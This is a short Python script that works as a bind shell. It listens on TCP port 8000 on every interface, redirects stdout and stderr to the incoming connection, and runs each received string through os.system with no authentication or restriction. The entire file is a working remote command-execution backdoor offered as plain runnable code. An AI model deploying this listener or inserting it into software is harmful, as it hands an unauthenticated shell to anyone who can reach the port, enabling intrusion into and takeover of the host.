#!/usr/bin/python3
import socket
import os

PORT = 8000

STDOUT_FD = 1
STDERR_FD = 2

MAX_CONN = 1
RECV_BUFF = 1 << 10

def set_sv():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("", PORT))
    s.listen(MAX_CONN)
    return s

def prep_fds(conn_fd):
    os.dup2(conn_fd, STDOUT_FD)
    os.dup2(conn_fd, STDERR_FD)

# cliente inicia cierre de conexion
def cmd_loop(conn_s):
    while cmd := conn_s.recv(RECV_BUFF).decode("utf-8"):
        os.system(cmd)

def main():
    s = set_sv()
    (conn_s, addr) = s.accept()

    prep_fds(conn_s.fileno())

    cmd_loop(conn_s)

    conn_s.close()
    s.close()

if __name__ == "__main__":
    main()
